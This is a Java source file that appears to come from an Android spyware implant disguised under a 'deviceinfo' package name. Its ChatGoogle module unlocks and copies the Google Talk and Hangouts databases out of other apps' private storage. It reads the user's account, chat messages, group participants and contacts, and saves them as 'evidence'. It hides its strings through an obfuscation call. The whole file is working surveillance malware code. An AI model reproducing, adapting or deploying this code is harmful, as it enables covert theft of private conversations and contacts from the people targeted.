package com.android.deviceinfo.module.chat;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.concurrent.Semaphore;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Document;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import android.database.Cursor;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.db.GenericSqliteHelper;
import com.android.deviceinfo.db.RecordVisitor;
import com.android.deviceinfo.file.Path;
import com.android.deviceinfo.manager.ManagerModule;
import com.android.deviceinfo.module.ModuleAddressBook;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.StringUtils;
import com.android.m.M;

public class ChatGoogle extends SubModuleChat {

	private static final String TAG = "ChatGoogle";

	private static final int PROGRAM = 0x04;

	String pObserving = M.e("com.google.android.talk");

	Semaphore readChatSemaphore = new Semaphore(1, true);

	@Override
	int getProgramId() {
		return PROGRAM;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram(String processName) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification stop)");
		}
		readChatMessages();
	}

	/**
	 * Estrae dal file RegisterPhone.xml il numero di telefono
	 * 
	 * @return
	 */
	@Override
	protected void start() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStart)");
		}
		readChatMessages();
	}

	private void readChatMessages() {

		long[] lastLines = markup.unserialize(new long[2]);

		readHangoutMessages(lastLines);
		readGoogleTalkMessages(lastLines);

		serializeMarkup(lastLines);
	}

	private void serializeMarkup(long[] lastLines) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readChatMessages): updating markup");
		}
		try {
			markup.writeMarkupSerializable(lastLines);
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatWeChatMessages) Error: " + e);
			}
		}
	}

	private void readHangoutMessages(long[] lastLines) {
		String dbFile = M.e("babel0.db");
		String dbDir = M.e("/data/data/com.google.android.talk/databases");

		String account = readAccount();
		//if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
		//	saveContacts(helper);
		//}
	
		String sql_c = M.e("select cp.conversation_id, latest_message_timestamp, full_name, latest_message_timestamp from conversations as c ") +
				M.e("join conversation_participants as cp on c.conversation_id=cp.conversation_id join participants as p on  cp.participant_row_id=p._id");
		
		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
		if(helper == null){
			return;
		}
		helper.deleteAtEnd = false;
		
		ChatGroups groups = new ChatGroups();

		long newHangoutReadDate = 0;
		List<HangoutConversation> conversations = getHangoutConversations(helper, account, lastLines[1]);
		for (HangoutConversation sc : conversations) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readHangoutMessages) conversation: " + sc.id + " date: " + sc.date);
			}

			// retrieves the lastConvId recorded as evidence for this
			// conversation
			if (sc.isGroup() && !groups.hasMemoizedGroup(sc.id)) {
				fetchHangoutParticipants(helper, account, sc.id, groups);
				//groups.addPeerToGroup(sc.id, account);
			}

			long lastReadId = fetchHangoutMessages(helper, sc, groups, lastLines[1]);
			newHangoutReadDate = Math.max(newHangoutReadDate, lastReadId);

		}
		if (newHangoutReadDate > 0) {
			lastLines[1] = newHangoutReadDate;
		}
		helper.deleteDb();

	}

	private long fetchHangoutMessages(GenericSqliteHelper helper, final HangoutConversation conversation, final ChatGroups groups, long lastTimestamp) {
		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
		
		String sql_m = String.format(M.e("select m._id, full_name, fallback_name ,text, timestamp, type, p.chat_id ") +
				M.e("from messages as m join participants as p on m.author_chat_id = p.chat_id where type<3 and conversation_id='%s' and timestamp>%s"), 
				conversation.id, lastTimestamp);
		
		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				// I read a line in a conversation.
				int id = cursor.getInt(0);
				String fullName = cursor.getString(1);
				String fallback_name = cursor.getString(2);
				String body = cursor.getString(3);
				long timestamp = cursor.getLong(4);
		
				boolean incoming = cursor.getInt(5) == 2;
				String chat_id = cursor.getString(6);
						
				String peer = fullName;
				if (fallback_name!=null)
					peer = fallback_name;

				// localtime or gmt? should be converted to gmt
				Date date = new Date(timestamp/1000);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (cursor) peer: " + peer + " timestamp: " + timestamp + " incoming: "
							+ incoming);
				}

				boolean isGroup = conversation.isGroup();

				if (Cfg.DEBUG) {
					Check.log(TAG + " (cursor) incoming: " + incoming + " group: " + isGroup);
				}

				String from, to = null;
				String fromDisplay, toDisplay = null;

				from = incoming ? peer : conversation.account;
				fromDisplay = incoming ? peer : conversation.account;

				Contact contact = groups.getContact(peer);
		
				if (isGroup) {
					// if (peer.equals("0")) {
					// peer = conversation.account;
					// }
					to = groups.getGroupToName(from, conversation.id);
					toDisplay = to;
				} else {
					to = incoming ? conversation.account : conversation.remote;
					toDisplay = incoming ? conversation.account : conversation.remote;
				}

				if (!StringUtils.isEmpty(body)) {
					MessageChat message = new MessageChat(getProgramId(), date, from, fromDisplay, to, toDisplay,
							body, incoming);

					if (Cfg.DEBUG) {
						Check.log(TAG + " (cursor) message: " + message.from + " "
								+ (message.incoming ? "<-" : "->") + " " + message.to + " : " + message.body);
					}
					messages.add(message);
				}

				return timestamp;
			}
		};
		
		long newLastId = helper.traverseRawQuery(sql_m, new String[]{}, visitor);

		if (messages != null && messages.size() > 0) {
			saveEvidence(messages);
		}
		
		return newLastId;
	}
	
	public void saveEvidence(ArrayList<MessageChat> messages) {
		getModule().saveEvidence(messages);
	}

	private void fetchHangoutParticipants(GenericSqliteHelper helper, final String account, final String thread_id, final ChatGroups groups) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchHangoutParticipants) : " + thread_id);
		}

		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				String id = cursor.getString(0);
				String fullname = cursor.getString(1);
				String fallback = cursor.getString(2);

				Contact contact;

				String email = fullname;
				if(fallback!=null)
					email = fallback;
				
				contact = new Contact(id, email, fullname, "");

				if (Cfg.DEBUG) {
					Check.log(TAG + " (fetchParticipants) %s", contact);
				}

				if (email != null) {
					groups.addPeerToGroup(thread_id, contact);
				}
				return 0;
			}
		};

		String sqlquery = M.e("select  p.chat_id, full_name, fallback_name, cp.conversation_id from conversation_participants as cp join participants as p on  cp.participant_row_id=p._id where conversation_id=?");
		helper.traverseRawQuery(sqlquery, new String[] { thread_id }, visitor);
	}

	private List<HangoutConversation> getHangoutConversations(GenericSqliteHelper helper, final String account, long timestamp) {
		final List<HangoutConversation> conversations = new ArrayList<HangoutConversation>();
		
		String[] projection = new String[] { M.e("conversation_id"), M.e("latest_message_timestamp"), M.e("conversation_type"), M.e("generated_name") };
		String selection = "latest_message_timestamp > " + timestamp;

		RecordVisitor visitor = new RecordVisitor(projection, selection) {

			@Override
			public long cursor(Cursor cursor) {
				HangoutConversation c = new HangoutConversation();
				c.account = account;

				c.id = cursor.getString(0);
				c.date = cursor.getLong(1);
				c.group = cursor.getInt(2) == 2;
				c.remote = cursor.getString(3);

				c.group = true;
				conversations.add(c);
				return 0;
			}
		};

		helper.traverseRecords(M.e("conversations"), visitor);

		return conversations;
		
	}

	private String readAccount() {
		String xmlDir = M.e("/data/data/com.google.android.talk/shared_prefs");
		String xmlFile = M.e("accounts.xml");
		
		Path.unprotect(xmlDir, xmlFile, true);

		DocumentBuilder builder;
		String account = null;
		try {
			builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
			Document doc = builder.parse(new File(xmlDir, xmlFile));
			NodeList defaults = doc.getElementsByTagName("string");
			for (int i = 0; i < defaults.getLength(); i++) {
				Node d = defaults.item(i);
				NamedNodeMap attributes = d.getAttributes();
				Node attr = attributes.getNamedItem("name");
				if("0.name".equals(attr.getNodeValue())){
					Node child = d.getFirstChild();
					account = child.getNodeValue();
					break;
				}
			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readAccount) Error: " + e);
			}
		}
		if(account!=null){
			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.GOOGLE, account);
		}
		
		return account;
		
	}

	private void readGoogleTalkMessages(long[] lastLines) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readChatMessages)");
		}

		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages), semaphore red");
			}

			return;
		}

		try {
			boolean updateMarkup = false;

			String dbFile = M.e("talk.db");
			String dbDir = M.e("/data/data/com.google.android.gsf/databases");

			GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);

			if (helper != null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages): can read DB");
				}

				helper.deleteAtEnd = false;

				setMyAccount(helper);

				// Save contacts if AddressBook is active
				if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
					saveContacts(helper);
				}

				long newLastLine = fetchGTalkMessages(helper, lastLines[0]);
				lastLines[0] = newLastLine;

				helper.deleteDb();

			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages) Error, file not readable: " + dbFile);
				}
			}
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatWeChatMessages) Error: ", ex);
			}
		} finally {

			readChatSemaphore.release();
		}
	}

	private long fetchGTalkMessages(GenericSqliteHelper helper, long lastLine) {
		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();

		String sqlquery = M.e("select m.date, ac.name, m.type, body, co.username, co.nickname from messages as m join  contacts as co on m.thread_id = co._id join accounts as ac on co.account = ac._id where m.consolidation_key is null and m.type<=1 and m.date>?");
		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				long createTime = cursor.getLong(0);
				// localtime or gmt? should be converted to gmt
				Date date = new Date(createTime);
				String account = cursor.getString(1);
				int isSend = cursor.getInt(2);
				boolean incoming = isSend == 1;
				String content = cursor.getString(3);
				String co_username = cursor.getString(4);
				String co_nick = cursor.getString(5);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (cursor) %s] %s %s %s: %s ", date, account, (incoming ? "<-" : "->"), co_nick,
							content);
				}
				String from_id, from_display, to_id, to_display;

				if (co_nick == null || co_nick.startsWith(M.e("private-chat"))) {
					return 0;
				}

				if (incoming) {
					from_id = co_username;
					from_display = co_nick;
					to_id = account;
					to_display = account;
				} else {
					from_id = account;
					from_display = account;
					to_id = co_username;
					to_display = co_nick;
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (cursor) %s -> %s", from_id, to_id);
				}
				MessageChat message = new MessageChat(PROGRAM, date, from_id, from_display, to_id, to_display, content,
						incoming);
				messages.add(message);

				return createTime;
			}
		};
		long lastCreationLine = helper.traverseRawQuery(sqlquery, new String[] { Long.toString(lastLine) }, visitor);

		getModule().saveEvidence(messages);

		return lastCreationLine;
	}

	private void setMyAccount(GenericSqliteHelper helper) {
		String[] projection = new String[] { "_id", "name", "username" };
		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				int id = cursor.getInt(0);
				String name = cursor.getString(1);
				String username = cursor.getString(2);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (setMyAccount) %s, %s", name, username);
				}

				ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.GOOGLE, name);

				return id;
			}
		};

		long ret = helper.traverseRecords("accounts", visitor);

	}

	private void saveContacts(GenericSqliteHelper helper) {
		String[] projection = new String[] { "username", "nickname" };

		boolean tosave = false;
		RecordVisitor visitor = new RecordVisitor(projection, "nickname not null ") {

			@Override
			public long cursor(Cursor cursor) {

				String username = cursor.getString(0);
				String nick = cursor.getString(1);

				Contact c = new Contact(username, username, nick, "");
				if (username != null && !username.endsWith(M.e("public.talk.google.com"))) {
					if (ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.GOOGLE, c)) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (cursor) need to serialize");
						}
						return 1;
					}
				}
				return 0;
			}
		};

		if (helper.traverseRecords(M.e("contacts"), visitor) == 1) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveContacts) serialize");
			}
			ModuleAddressBook.getInstance().serializeContacts();
		}
	}
}
